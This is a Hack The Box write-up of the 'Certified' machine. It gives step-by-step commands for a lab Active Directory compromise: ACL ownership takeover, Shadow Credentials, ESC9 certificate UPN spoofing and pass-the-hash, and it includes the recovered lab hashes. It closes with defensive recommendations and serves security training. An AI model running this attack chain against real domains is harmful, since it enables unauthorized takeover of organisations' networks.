---
title: "HTB - Certified"
author: "M0k4"
date: "2026-05-25"
tags: ["htb", "writeup", "windows", "medium", "active-directory", "bloodhound", "acl-abuse", "shadow-credentials", "adcs", "esc9"]
---

# HTB - Certified

**IP Address:** `10.129.231.186`  
**OS:** `Windows Server 2019 Build 17763`  
**Difficulty:** `Medium`  
**Tags:** #ActiveDirectory #BloodHound #ACLAbuse #ShadowCredentials #ADCS #ESC9

---
## Synopsis

Certified is a medium-difficulty Windows machine built around an assumed breach scenario where credentials for a low-privileged domain user are provided. Active Directory ACL enumeration via BloodHound reveals a chain of abusable permissions: the initial user holds WriteOwner over a management group, which in turn has GenericWrite over a service account with WinRM access. Exploiting this ACL chain through ownership takeover, DACL modification, and Shadow Credentials grants a foothold as `management_svc`. Lateral movement to `ca_operator` via GenericAll and another Shadow Credentials attack unlocks access to a misconfigured AD CS certificate template vulnerable to ESC9. By spoofing the User Principal Name on a certificate request, the Administrator's NTLM hash is recovered, yielding full domain compromise.

---
## Skills Required

- Basic Active Directory domain enumeration
- Understanding of Windows authentication (NTLM, Kerberos)
- Familiarity with AD ACLs and group permissions

## Skills Learned

- Active Directory enumeration with BloodHound Community Edition
- ACL chain abuse (WriteOwner → GenericWrite → GenericAll)
- Shadow Credentials attacks with pywhisker and PKINITtools
- AD CS enumeration and ESC9 exploitation with Certipy
- UPN spoofing for certificate-based privilege escalation

---
## 1. Initial Enumeration

### 1.1 Connectivity Test

Check if the host is alive using ICMP:

```bash
ping -c 1 10.129.231.186
```

![ping](certified_01_ping.png)

The TTL of 127 confirms a Windows host (default TTL 128, decremented by one hop).

---
### 1.2 Port Scanning

Scan all TCP ports to identify open services:

```bash
nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.129.231.186 -oG allPorts
```

- `-p-` : Scan all 65,535 ports  
- `--open` : Show only open ports  
- `-sS` : SYN scan (stealthy and fast)  
- `--min-rate 5000` : Increase scan speed  
- `-Pn` : Skip host discovery  
- `-oG` : Output in grepable format  

![allports](certified_02_nmap_allports.png)

Extract the open ports:

```bash
extractPorts allPorts
```

![extractports](certified_03_extractports.png)

18 open ports identified, all consistent with a Domain Controller profile.

---
### 1.3 Targeted Scan

Run a deeper scan on the identified ports with version detection and default scripts:

```bash
nmap -sCV -p53,88,135,139,389,445,593,636,3268,3269,5985,9389,49667,49693,49694,49695,49724,49733 10.129.231.186 -oN targeted
cat targeted
```

- `-sC` : Run default NSE scripts  
- `-sV` : Detect service versions  
- `-oN` : Output in human-readable format  

![targeted 1](certified_04_nmap_targeted_1.png)
![targeted 2](certified_05_nmap_targeted_2.png)

**Findings:**

| Port(s) | Service | Notes |
|---|---|---|
| 53 | DNS | Simple DNS Plus |
| 88 | Kerberos | Microsoft Windows Kerberos |
| 389/636/3268/3269 | LDAP/LDAPS | Domain: certified.htb, DC: DC01.certified.htb |
| 445 | SMB | Signing enabled and required |
| 5985 | WinRM | Microsoft HTTPAPI 2.0 |
| 9389 | ADWS | .NET Message Framing |

The target is a **Domain Controller** for `certified.htb` with hostname `DC01.certified.htb`. SMB signing is required (no relay attacks). A 7-hour clock skew is noted for later Kerberos operations.

Add the domain to `/etc/hosts`:

```bash
echo '10.129.231.186 certified.htb dc01.certified.htb' | sudo tee -a /etc/hosts
```

---
## 2. Service Enumeration

### 2.1 SMB and WinRM Authentication

With provided credentials `judith.mader:judith09`, authentication is verified against SMB and WinRM to determine the user's access level:

```bash
nxc smb 10.129.231.186 -u judith.mader -p 'judith09'
nxc winrm 10.129.231.186 -u judith.mader -p 'judith09'
```

![nxc smb winrm](certified_06_nxc_smb_winrm.png)

SMB authentication succeeds, confirming valid credentials. WinRM access is denied — `judith.mader` is not in the Remote Management Users group.

---
### 2.2 Domain User Enumeration

Using the authenticated RPC session to enumerate all domain users:

```bash
rpcclient -U "judith.mader%judith09" 10.129.231.186 -c "enumdomusers"
```

![rpcclient users](certified_07_rpcclient_users.png)

Nine domain users are discovered. Two service accounts stand out: `management_svc` and `ca_operator`, suggesting management functions and certificate operations respectively.

---
### 2.3 BloodHound AD Enumeration

To map attack paths through AD ACLs, data is collected with `bloodhound-python` and imported into BloodHound Community Edition:

```bash
bloodhound-python -d certified.htb -u 'judith.mader' -p 'judith09' -dc 'dc01.certified.htb' -c all -ns 10.129.231.186
```

![bloodhound collection](certified_08_bloodhound_collection.png)

Kerberos authentication fails due to the 7-hour clock skew but falls back to NTLM successfully. The collection yields 10 users, 53 groups, and complete ACL data.

After importing into BloodHound CE (started via `curl -L https://ghst.ly/getbhce | docker compose -f - up`), marking `judith.mader` as Owned and inspecting Outbound Object Control reveals the full ACL attack chain:

![bh writeowner](certified_09_bh_writeowner.png)

**ACL chain discovered:**

1. `judith.mader` → **WriteOwner** → `MANAGEMENT` group
2. `MANAGEMENT` group → **GenericWrite** → `management_svc`
3. `management_svc` → **GenericAll** → `ca_operator`

The `management_svc` account has WinRM access (CanPSRemote), making it the foothold target.

---
## 3. Foothold

### 3.1 ACL Chain Abuse — Ownership and Group Membership

The WriteOwner permission allows `judith.mader` to take ownership of the MANAGEMENT group, grant herself full control, and join the group. This is performed using impacket tools:

```bash
impacket-owneredit -action write -new-owner 'judith.mader' -target 'management' 'certified.htb/judith.mader:judith09'
impacket-dacledit -action write -rights 'WriteMembers' -principal 'judith.mader' -target-dn 'CN=MANAGEMENT,CN=USERS,DC=CERTIFIED,DC=HTB' 'certified.htb/judith.mader:judith09'
net rpc group addmem "Management" "judith.mader" -U "certified.htb"/"judith.mader"%'judith09' -S 10.129.231.186
```

![acl ownership](certified_10_acl_ownership.png)

All three steps succeed: ownership transferred, DACL modified with WriteMembers rights, and `judith.mader` added to the MANAGEMENT group.

---
### 3.2 Shadow Credentials on management_svc

As a member of the MANAGEMENT group (which has GenericWrite over `management_svc`), Shadow Credentials are planted on the target account using pywhisker:

```bash
pywhisker -d certified.htb -u judith.mader -p 'judith09' --target management_svc --action add
```

![pywhisker mgmtsvc](certified_11_pywhisker_mgmtsvc.png)

A PFX certificate is generated that can be used for PKINIT authentication as `management_svc`.

---
### 3.3 PKINIT Authentication and Hash Recovery

The PFX certificate is used with PKINITtools to obtain a TGT and recover the NTLM hash. Due to the 7-hour clock skew, the NTP daemon must be disabled and the clock synced immediately before the Kerberos operations — all chained in a single command:

```bash
sudo systemctl stop systemd-timesyncd; sudo timedatectl set-ntp false
sudo ntpdate 10.129.231.186 && \
python3 gettgtpkinit.py -cert-pfx B8FrItl7.pfx -pfx-pass afJOKTYzSjEUtTWVO7cN certified.htb/management_svc management_svc.ccache 2>&1 | tee /tmp/tgt.txt && \
KEY=$(grep -oP '[a-f0-9]{64}' /tmp/tgt.txt | tail -1) && \
KRB5CCNAME=management_svc.ccache python3 getnthash.py -key $KEY -dc-ip 10.129.231.186 certified.htb/management_svc
```

![pkinit nthash mgmtsvc](certified_12_pkinit_mgmtsvc_hash.png)

**Recovered:** `management_svc` NT Hash: `a091c1832bcdd4677c28b5a6a1295584`

---
### 3.4 WinRM Access as management_svc

With the NTLM hash, Pass-the-Hash confirms WinRM access and provides a shell:

```bash
nxc winrm 10.129.231.186 -u management_svc -H a091c1832bcdd4677c28b5a6a1295584
evil-winrm -i 10.129.231.186 -u management_svc -H a091c1832bcdd4677c28b5a6a1295584
```

![nxc winrm mgmtsvc](certified_13_nxc_mgmtsvc_pwned.png)
![user flag](certified_14_user_flag.png)

🏁 **User flag obtained:** `C:\Users\management_svc\Desktop\user.txt`

---
## 4. Privilege Escalation

### 4.1 Lateral Movement to ca_operator

BloodHound showed that `management_svc` has GenericAll over `ca_operator`. The same Shadow Credentials technique is applied — pywhisker plants credentials, PKINITtools extracts the NTLM hash:

```bash
pywhisker -d "certified.htb" -u "management_svc" -H :a091c1832bcdd4677c28b5a6a1295584 --target "ca_operator" --action "add"
python3 gettgtpkinit.py -cert-pfx QLAg442w.pfx -pfx-pass BlvC0BWhNT6vaj0dO2Hg certified.htb/ca_operator ca_operator.ccache
KRB5CCNAME=ca_operator.ccache python3 getnthash.py -key 97b70d377dc14ef776d417128c5ac126136a7f632055613d7e6bd9d5331aaad9 -dc-ip 10.129.231.186 certified.htb/ca_operator
```

![lateral ca_operator](certified_15_lateral_ca_operator.png)

**Recovered:** `ca_operator` NT Hash: `b4b86f45c6018f1b664f70805f45d8f2`. This account has SMB access but no WinRM — its value lies in AD CS enrollment rights.

---
### 4.2 AD CS Enumeration (ESC9)

Using certipy to enumerate vulnerable certificate templates with the `ca_operator` account:

```bash
certipy-ad find -u ca_operator@certified.htb -hashes b4b86f45c6018f1b664f70805f45d8f2 -dc-ip 10.129.231.186 -vulnerable -stdout
```

![certipy adcs enum](certified_16_certipy_adcs_enum.png)

The **CertifiedAuthentication** template is vulnerable to **ESC9**:
- `NoSecurityExtension` enrollment flag — certificates contain no object SID
- `Client Authentication` enabled — the cert can be used for AD authentication
- `SubjectAltRequireUpn` — the UPN in the cert determines the authenticated identity
- Enrollment rights: `CERTIFIED.HTB\operator ca` (ca_operator can enroll)

Since certificates have no embedded SID, the DC authenticates based solely on the UPN field. By changing `ca_operator`'s UPN to `Administrator` before requesting a certificate, authentication as Administrator becomes possible.

---
### 4.3 ESC9 Exploitation — UPN Spoofing

The attack is executed in three steps: change UPN, request certificate, restore UPN. The `management_svc` account (which has GenericAll over `ca_operator`) modifies the UPN:

```bash
certipy-ad account update -username management_svc@certified.htb -hashes a091c1832bcdd4677c28b5a6a1295584 -user ca_operator -upn Administrator
certipy-ad req -username ca_operator@certified.htb -hashes b4b86f45c6018f1b664f70805f45d8f2 -ca certified-DC01-CA -template CertifiedAuthentication -dc-ip 10.129.231.186
certipy-ad account update -username management_svc@certified.htb -hashes a091c1832bcdd4677c28b5a6a1295584 -user ca_operator -upn ca_operator@certified.htb
```

The certificate is issued with UPN `Administrator` and no object SID. Authenticating with it yields the Administrator's NTLM hash:

```bash
certipy-ad auth -pfx administrator.pfx -domain certified.htb -dc-ip 10.129.231.186
```

![esc9 exploit](certified_17_esc9_exploit.png)

**Recovered:** `administrator` NT Hash: `0d5b49608bbce1751f708748f67e2d34`

---
### 4.4 Administrator Access

Pass-the-Hash confirms full administrative access via both SMB and WinRM:

```bash
nxc smb 10.129.231.186 -u administrator -H 0d5b49608bbce1751f708748f67e2d34
nxc winrm 10.129.231.186 -u administrator -H 0d5b49608bbce1751f708748f67e2d34
evil-winrm -i 10.129.231.186 -u administrator -H 0d5b49608bbce1751f708748f67e2d34
```

![nxc admin pwned](certified_18_nxc_admin_pwned.png)
![root flag](certified_19_root_flag.png)

🏁 **Root flag obtained:** `C:\Users\Administrator\Desktop\root.txt`

---
# ✅ MACHINE COMPLETE

---
## Summary of Exploitation Path

1. **Nmap** reveals a Domain Controller for `certified.htb` with standard AD services and WinRM.
2. **BloodHound** enumeration with provided credentials (`judith.mader:judith09`) maps an ACL attack chain: WriteOwner → GenericWrite → GenericAll across three objects.
3. **ACL abuse** with impacket tools grants `judith.mader` ownership and membership in the MANAGEMENT group.
4. **Shadow Credentials** (pywhisker + PKINITtools) on `management_svc` yield an NTLM hash, granting **WinRM access** and the user flag.
5. **GenericAll** over `ca_operator` allows another Shadow Credentials attack to recover that account's hash.
6. **Certipy** identifies the CertifiedAuthentication template as vulnerable to **ESC9** (NoSecurityExtension).
7. **UPN spoofing** changes `ca_operator`'s UPN to `Administrator`, a certificate is requested, and the UPN is restored.
8. **Certificate authentication** with the spoofed cert recovers the Administrator NTLM hash.
9. **Pass-the-Hash** via Evil-WinRM provides a shell as Administrator and the root flag.

---
## Defensive Recommendations

- **Audit AD ACLs regularly:** Remove unnecessary WriteOwner, GenericWrite, and GenericAll permissions. Use tools like BloodHound to detect dangerous attack paths before attackers do.
- **Restrict group ownership:** The MANAGEMENT group should not be owned by or grant write access to low-privileged users. Apply least-privilege principles to all group DACLs.
- **Monitor msDS-KeyCredentialLink changes:** Shadow Credential attacks modify this attribute. Alert on unexpected changes to detect PKINIT-based lateral movement.
- **Fix AD CS template misconfigurations:** Add the `szOID_NTDS_CA_SECURITY_EXT` security extension to certificate templates (removes the NoSecurityExtension flag that enables ESC9). Restrict enrollment to specific groups.
- **Enforce SMB signing and disable NTLM where possible:** While SMB signing was enabled, NTLM Pass-the-Hash remained viable. Consider requiring Kerberos authentication for sensitive services.
- **Implement tiered administration:** Service accounts like `management_svc` and `ca_operator` should not have broad ACL control over each other. Separate administrative tiers to limit lateral movement.
